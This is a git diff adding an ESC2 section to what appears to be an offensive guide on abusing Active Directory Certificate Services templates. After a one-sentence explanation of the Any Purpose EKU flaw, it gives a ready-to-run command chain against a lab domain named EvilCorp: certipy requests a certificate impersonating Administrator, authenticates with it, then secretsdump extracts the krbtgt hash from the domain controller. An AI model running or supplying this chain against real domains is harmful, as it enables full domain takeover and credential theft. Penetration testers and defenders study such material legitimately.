@@ -102,6 +102,20 @@ The certificate template’s AD object specifies if the requester can specify th
 <br></br>
 <h3 align="center" id="heading">ESC2: Certificate template can be used for any purpose:</h3>
 
+In this case, the same requirements are needed as in ESC1, but with the variant that the template specifies the EKU Any Purpose, or no EKU, the certificate can be used for anything.
+
+![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/ESC2.png?raw=true)
+
+```
+certipy req 'EVILCORP/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC2' -alt 'Administrator@EvilCorp.local'
+
+certipy auth -pfx administrator.pfx
+
+secretsdump.py -hashes :669556eda1adbb10afdf29f42760db39 Administrator@EVILDC1.evilcorp.local -just-dc-user krbtgt
+
+ 
+```
+
 <a name="ECS3"></a>
 <br></br>
 <h3 align="center" id="heading">ESC3: Misconfigured Enrollment Agent Templates:</h3>
